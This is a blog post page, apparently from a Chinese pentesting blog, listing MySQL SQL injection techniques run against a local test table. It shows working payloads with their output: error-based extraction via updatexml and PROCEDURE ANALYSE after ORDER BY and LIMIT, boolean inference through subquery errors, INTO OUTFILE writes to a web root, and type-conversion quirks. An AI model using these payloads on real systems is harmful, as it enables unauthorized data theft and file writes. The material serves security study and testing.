@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="记录一些非常见的注入手法，或者说是 mysql 的一些特性"/>
+  <meta name="author" content="Reber"/>
+  
+    
+      <title>SQL注入 tips(MySQL) | Reber&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
+  
+    <link rel="stylesheet" href="/css/style.css"/>
+  
+  
+    <script src="/js/jquery-3.6.0.min.js"/></script>
+  
+    <script src="/js/highlight.min.js"/></script>
+  
+    <script src="/js/style.js"/></script>
+  
+  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <header>
+  <div id="brand">
+    <a class="icon-link" href="https://wyb0.com/">
+      <img
+        class="icon"
+        src="/img/logo.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
+      <h3>只会一点点编程、只会一点点渗透</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/friends/"><b>Friends</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+    <div id="content">
+      
+  <main>
+    <article>
+      <h1>SQL注入 tips(MySQL)</h1>
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2018-05-23</time>
+    <span>in</span>
+    
+      <a href="/categories/Pentest">Pentest</a>
+  </strong>
+  <span> • 1476 words</span>
+  <span> • 3 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/injection">injection</a>
+    </div>
+  
+</div>
+
+      <div>
+
+<p>环境：MySQL 5.5.47</p>
+
+<h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面</h3>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
+Query OK, 1 row affected (0.01 sec)
+</code></pre>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~msg~'
+</code></pre>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~rtest~'
+</code></pre>
+
+<pre><code>mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2));
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by if(1=2,1,(select 1 union select 2));
+ERROR 1242 (21000): Subquery returns more than 1 row
+
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&gt;1) then 1 else 1*(select 1 union select 2)end)=1;
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&lt;1) then 1 else 1*(select 1 union select 2)end)=1;
+ERROR 1242 (21000): Subquery returns more than 1 row
+</code></pre>
+
+<h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面</h3>
+
+<ul>
+<li>limit前面没有order by可以使用union、analyse()</li>
+</ul>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 union select 1,2,3;
++----+------+---------+
+| id | name | content |
++----+------+---------+
+|  1 | 2    | 3       |
++----+------+---------+
+1 row in set (0.01 sec)
+
+mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse();
++-------------------+---------------+---------------+------------+------------+
+| Field_name        | Min_value     | Max_value     | Min_length | Max_length |
++-------------------+---------------+---------------+------------+------------+
+| rtest.msg.name    | xiaohong      | xiaohong      |          8 |          8 |
+| rtest.msg.content | I have a cat. | I have a cat. |         13 |         13 |
++-------------------+---------------+---------------+------------+------------+
+
+------------------+-------+-------------------------+------+--------------------+
+ Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype  |
+------------------+-------+-------------------------+------+--------------------+
+     0 |     0 | 8.0000                  | NULL | ENUM('xiaohong') NOT NULL     |
+     0 |     0 | 13.0000                 | NULL | ENUM('I have a cat.') NOT NULL|
+------------------+-------+-------------------------+------+--------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+
+<ul>
+<li>limit前面有order by则不可以使用union、analyse()</li>
+</ul>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
+
+mysql&gt; select id,name,content from msg where id&gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
+</code></pre>
+
+<h3 id="0x02-根据报错得到数据库名-表名-列名">0x02 根据报错得到数据库名、表名、列名</h3>
+
+<pre><code>#得到数据库名为rtest
+mysql&gt; select id,name,content from msg where id=2-a();
+ERROR 1305 (42000): FUNCTION rtest.a does not exist
+
+#得到表名为msg
+mysql&gt; select id,name,content from msg where id=2 and polygon(1);
+ERROR 1367 (22007): Illegal non geometric '1' value found during parsing
+mysql&gt; select id,name,content from msg where id=2 and polygon(id);
+ERROR 1367 (22007): Illegal non geometric '`rtest`.`msg`.`id`' value found during parsing
+
+#得到列名为id、name、content、useragent
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
+ERROR 1060 (42S21): Duplicate column name 'id'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
+ERROR 1060 (42S21): Duplicate column name 'name'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
+ERROR 1060 (42S21): Duplicate column name 'content'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
+ERROR 1060 (42S21): Duplicate column name 'useragent'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
+ERROR 1241 (21000): Operand should contain 1 column(s)
+</code></pre>
+
+<h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换</h3>
+
+<ul>
+<li><p>官方隐式转换规则</p>
+
+<ul>
+<li>两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;=&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换</li>
+<li>两个参数都是字符串，会按照字符串来比较，不做类型转换</li>
+<li>两个参数都是整数，按照整数来比较，不做类型转换</li>
+<li>十六进制的值和非数字做比较时，会被当做二进制串</li>
+<li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp</li>
+<li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li>
+<li>所有其他情况下，两个参数都会被转换为浮点数再进行比较</li>
+</ul></li>
+
+<li><p>数字和字符进行运算时会转换为double类型</p></li>
+</ul>
+
+<pre><code>mysql&gt; select 2+'4'; #数字和字符会转换为数字
++-------+
+| 2+'4' |
++-------+
+|     6 |
++-------+
+1 row in set (0.00 sec)
+</code></pre>
+
+<pre><code>mysql&gt; select 'a'+'55'; #字符和字符会转换为数字
++----------+
+| 'a'+'55' |
++----------+
+|       55 |
++----------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select '33'+'32d11a';
++-----------+
+| '33'+'3d' |
++-----------+
+|        65 |
++-----------+
+1 row in set, 1 warning (0.00 sec)
+</code></pre>
+
+<ul>
+<li>concat()函数将数字转换为字符</li>
+</ul>
+
+<pre><code>mysql&gt; select concat(3,'test'); #前面的数字1被转换为字符
++------------------+
+| concat(3,'test') |
++------------------+
+| 3test            |
++------------------+
+1 row in set (0.00 sec)
+</code></pre>
+
+<ul>
+<li>name类型为string，查询条件为int 0时可以查询</li>
+</ul>
+
+<pre><code>mysql&gt; desc msg;
++-----------+---------------+------+-----+---------+----------------+
+| Field     | Type          | Null | Key | Default | Extra          |
++-----------+---------------+------+-----+---------+----------------+
+| id        | int(11)       | NO   | PRI | NULL    | auto_increment |
+| name      | varchar(30)   | NO   |     | NULL    |                |
+| content   | varchar(1024) | NO   |     | NULL    |                |
+| useragent | varchar(1024) | NO   |     | NULL    |                |
++-----------+---------------+------+-----+---------+----------------+
+4 rows in set (0.01 sec)
+
+mysql&gt; select id,name,content from msg where id=1 and name=0;
++----+----------+--------------+
+| id | name     | content      |
++----+----------+--------------+
+|  1 | xiaoming | hello world. |
++----+----------+--------------+
+1 row in set, 2 warnings (0.00 sec)
+
+mysql&gt; show warnings;
++---------+------+----------------------------------------------+
+| Level   | Code | Message                                      |
++---------+------+----------------------------------------------+
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
++---------+------+----------------------------------------------+
+2 rows in set (0.00 sec)
+
+</code></pre>
+
+<pre><code>mysql&gt; select id,name,content from msg;
++----+----------+---------------+
+| id | name     | content       |
++----+----------+---------------+
+|  1 | xiaoming | hello world.  |
+|  2 | xiaohong | I have a cat. |
+|  3 | 55lihua  | ni hao        |
++----+----------+---------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select id,name,content from msg where name='li'+'55';
++----+---------+---------+
+| id | name    | content |
++----+---------+---------+
+|  3 | 55lihua | ni hao  |
++----+---------+---------+
+1 row in set, 4 warnings (0.01 sec)
+
+mysql&gt; show warnings;
++---------+------+----------------------------------------------+
+| Level   | Code | Message                                      |
++---------+------+----------------------------------------------+
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'li'       |
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaohong' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: '55lihua'  |
++---------+------+----------------------------------------------+
+4 rows in set (0.00 sec)
+</code></pre>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="https://www.cnblogs.com/Le30bjectNs11/p/4341207.html">https://www.cnblogs.com/Le30bjectNs11/p/4341207.html</a></li>
+<li><a href="https://www.cnblogs.com/rollenholt/p/5442825.html">https://www.cnblogs.com/rollenholt/p/5442825.html</a></li>
+</ul>
+</div>
+    </article>
+  </main>
+
+    </div>
+    <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/reber0?_blank">GitHub</a>
+      
+         | 
+        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2015-2022
+    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
+
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
+  </p>
+</footer>
+
+  </body>
+</html>
